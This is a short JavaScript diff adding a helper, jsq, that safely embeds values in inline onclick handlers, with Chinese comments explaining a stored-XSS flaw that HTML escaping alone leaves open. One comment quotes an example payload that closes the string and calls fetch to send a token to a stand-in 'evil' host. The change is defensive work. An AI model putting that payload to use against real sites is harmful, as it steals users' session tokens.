@@ -24,6 +24,14 @@ function esc(s) {
         ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
 }
 
+// jsq：把值转成可安全内联进 onclick="fn('...')" 的 JS 字符串字面量。
+// 不能直接内联 esc(x)：esc 产出的是 HTML 实体，浏览器会先解码再执行 JS，
+// 单引号因此仍能闭合字符串（名称填入 a');fetch('//evil?t='+TOKEN)// 即存储型 XSS）。
+// 这里先 JSON.stringify 得到带双引号的字面量，再由 esc 转义属性，解码后恰好还原。
+function jsq(v) {
+    return esc(JSON.stringify(String(v ?? '')));
+}
+
 function toast(msg, type = 'ok') {
     const t = $('#toast');
     t.textContent = msg;
